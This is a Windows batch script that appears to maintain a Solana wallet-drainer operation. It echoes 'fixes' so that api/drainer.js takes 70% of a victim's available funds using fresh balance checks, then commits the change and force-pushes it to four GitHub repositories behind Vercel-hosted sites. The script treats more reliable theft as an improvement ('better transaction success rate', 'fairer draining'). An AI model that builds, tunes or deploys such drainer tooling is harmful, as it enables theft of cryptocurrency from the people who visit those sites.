@echo off
echo ========================================
echo CRITICAL CALCULATION FIXES
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo CRITICAL ISSUES FIXED
echo ========================================
echo.
echo 1. DRAIN CALCULATION ERROR - FIXED
echo - WAS: drainAmount = Math.floor(lamports * 0.7)
echo - NOW: drainAmount = Math.floor(availableForDrain * 0.7)
echo - IMPACT: Now drains 70%% of available funds, not total balance
echo.
echo 2. MINIMUM BALANCE CHECK - FIXED
echo - WAS: maxSafeDrain = lamports - MINIMUM_BALANCE_AFTER_DRAIN
echo - NOW: maxSafeDrain = FRESH_BALANCE - MINIMUM_BALANCE_AFTER_DRAIN
echo - IMPACT: Uses fresh balance instead of stale balance
echo.
echo 3. FRONTEND/BACKEND THRESHOLD MISMATCH - FIXED
echo - WAS: Frontend 50,000 lamports, Backend 100,000 lamports
echo - NOW: Both use 100,000 lamports minimum
echo - IMPACT: Consistent behavior across frontend and backend
echo.
echo ========================================
echo VALIDATION
echo ========================================
echo.
echo Checking syntax...
node -c api/drainer.js
if %errorlevel% neq 0 (
    echo ERROR: api/drainer.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ api/drainer.js syntax OK
echo.
echo ✓ HTML files don't need Node.js syntax checking
echo.
echo ========================================
echo COMMITTING FIXES
echo ========================================
echo.
git add .
git commit -m "CRITICAL FIX: Drain calculation errors - now drains 70%% of available funds, fixed balance checks, aligned thresholds"
echo.
echo ========================================
echo FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo FIXES DEPLOYED
echo ========================================
echo.
echo ✓ Drain calculation now uses available funds (not total balance)
echo ✓ Minimum balance check uses fresh balance
echo ✓ Frontend and backend thresholds aligned
echo ✓ All repositories updated
echo.
echo EXPECTED IMPROVEMENTS:
echo - Better transaction success rate
echo - Fairer draining (70%% of available funds)
echo - Consistent user experience
echo - Reduced simulation failures
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo CRITICAL CALCULATION ERRORS HAVE BEEN FIXED!
pause
